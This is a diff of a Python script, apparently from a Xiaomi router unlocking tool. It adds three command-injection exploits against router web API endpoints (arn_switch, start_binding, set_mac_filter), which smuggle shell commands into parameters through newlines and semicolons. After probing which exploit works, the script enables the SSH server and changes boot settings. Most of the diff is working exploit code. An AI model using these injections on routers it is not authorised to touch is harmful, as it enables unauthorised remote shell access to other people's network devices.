@@ -3,57 +3,95 @@
 
 import os
 import sys
+import time
 import requests
 
 import xmir_base
 from gateway import *
 
-# Devices:
-# RD01    FW ???
-# RD02    FW ???
-# RD03    FW ???        AX3000T
-# RD08    FW ???        Xiaomi 6500 Pro
+web_password = True
+if len(sys.argv) > 1 and sys.argv[0].endswith('connect6.py'):
+    if sys.argv[1]:
+        web_password = sys.argv[1]
+
+try:
+    gw = inited_gw
+except NameError:
+    gw = create_gateway(die_if_sshOk = False, web_login = web_password)
 
 
-gw = Gateway(timeout = 4, detect_ssh = False)
-if gw.status < 1:
-    die(f"Xiaomi Mi Wi-Fi device not found (IP: {gw.ip_addr})")
+def exploit_1(cmd, api = 'API/misystem/arn_switch'):
+    # vuln/exploit author: ?????????
+    cmd = cmd.replace(';', '\n')
+    params = { 'open': 0, 'mode': 1, 'level': "\n" + cmd + "\n" }
+    res = gw.api_request(api, params, resp = 'text')
+    time.sleep(0.5)
+    return res
 
-print(f"device_name = {gw.device_name}")
-print(f"rom_version = {gw.rom_version} {gw.rom_channel}")
-print(f"mac address = {gw.mac_address}")
+def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
+    # vuln/exploit author: ?????????
+    cmd = cmd.replace(';', '\n')
+    params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
+    try:
+        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
+    except requests.exceptions.ReadTimeout:
+        res = ''
+    return res
 
-dn = gw.device_name
-gw.ssh_port = 22
-ret = gw.detect_ssh(verbose = 1, interactive = True)
-if ret == 23:
-    if gw.use_ftp:
-        die("Telnet and FTP servers already running!")
-    print("Telnet server already running, but FTP server not respond")
-elif ret > 0:
-    #die(0, "SSH server already installed and running")
-    pass
+def exploit_3(cmd, api = 'API/xqsystem/set_mac_filter'):
+    # vuln/exploit author: ?????????
+    if '\n' in cmd:
+        raise ValueError('Incorrect shell command format')
+    options = { 'add': 0, 'del': 1 }
+    for action, option in options.items():
+        time.sleep(0.05)
+        time_ms = time.time_ns() // 1_000_000
+        name = f'xxx ; uci set diag.config.usb_read_thr={time_ms} ; uci commit diag ; ' + cmd
+        params = { 'mac': '00:00:00:00:00:33', 'name': name, 'option': option, 'wan': '' }
+        try:
+            res = gw.api_request(api, params, resp = 'text', timeout = 2)
+        except requests.exceptions.ReadTimeout:
+            res = ''
+        if not res or '"code":0' not in res:
+            return ''
+        diag = gw.get_diag_paras(timeout = 2)
+        if str(diag['usb_read_thr']) == str(time_ms):
+            return res  # Ok
+    return ''
 
-info = gw.get_init_info()
-if not info or info["code"] != 0:
-    die('Cannot get init_info')
 
-ccode = info["countrycode"]
-print(f'Current CountryCode = {ccode}')
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
-stok = gw.web_login()
+vuln_test_num = 82000011
+exec_cmd = None
+exp_list = [ exploit_2, exploit_1, exploit_3 ]
+for idx, exp_func in enumerate(exp_list):
+    exp_test_num = vuln_test_num + idx
+    res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
+    #if '"code":0' not in res:
+    #    continue
+    iperf_test_thr = gw.get_diag_iperf_test_thr()
+    if iperf_test_thr == str(exp_test_num):
+        exec_cmd = exp_func
+        break
+    time.sleep(0.5)
 
-def exec_cmd(cmd = {}, api = 'misystem/arn_switch'):
-    params = cmd
-    if isinstance(cmd, str):
-        cmd = cmd.replace(';', '\n')
-        params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
-res = exec_cmd('logger hello_world_3335556_')
-if '"code":0' not in res:
-    die('Exploit "arn_switch" not working!!!')
+if not exec_cmd:
+    raise ExploitNotWorked('Exploits "arn_switch/start_binding/set_mac_filter" not working!!!')
+
+if exec_cmd == exploit_1:
+    print('Exploit "arn_switch" detected!') 
+
+if exec_cmd == exploit_2:
+    print('Exploit "start_binding" detected!') 
+
+if exec_cmd == exploit_3:
+    print('Exploit "set_mac_filter" detected!') 
+
 
 exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
 exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
@@ -65,42 +103,5 @@ exec_cmd(r"/etc/init.d/dropbear restart")
 exec_cmd(r"logger -t XMiR ___completed___")
 
 time.sleep(0.5)
-gw.use_ssh = True
-gw.passw = 'root'
-ssh_en = gw.ping(verbose = 0, contimeout = 11)   # RSA host key generate slowly!
-if ssh_en:
-    print('#### SSH server are activated! ####')
-else:
-    print(f"WARNING: SSH server not responding (IP: {gw.ip_addr})")
 
-if not ssh_en:
-    print("")
-    print('Unlock TelNet server ...')
-    exec_cmd("bdata set telnet_en=1 ; bdata commit")
-    print('Run TelNet server on port 23 ...')
-    exec_cmd("/etc/init.d/telnet enable ; /etc/init.d/telnet restart")
-    time.sleep(0.5)
-    gw.use_ssh = False
-    telnet_en = gw.ping(verbose = 2)
-    if not telnet_en:
-        print(f"ERROR: TelNet server not responding (IP: {gw.ip_addr})")
-        sys.exit(1)
-    print("")
-    print('#### TelNet server are activated! ####')
-    #print("")
-    #print('Run FTP server on port 21 ...')
-    gw.run_cmd(r"rm -f /etc/inetd.conf")
-    gw.run_cmd(r"sed -i 's/\\tftpd\\t/\\tftpd -w\\t/g' /etc/init.d/inetd")
-    gw.run_cmd('/etc/init.d/inetd enable')
-    gw.run_cmd('/etc/init.d/inetd restart')
-    gw.use_ftp = True
-    ftp_en = gw.ping(verbose = 0)
-    if ftp_en:
-        print('#### FTP server are activated! ####')
-    else:
-        print(f"WARNING: FTP server not responding (IP: {gw.ip_addr})")
-
-if ssh_en or telnet_en:
-    gw.run_cmd('nvram set uart_en=1; nvram set boot_wait=on; nvram commit')
-    gw.run_cmd('nvram set bootdelay=3; nvram set bootmenu_delay=5; nvram commit')
-
+gw.post_connect(exec_cmd)
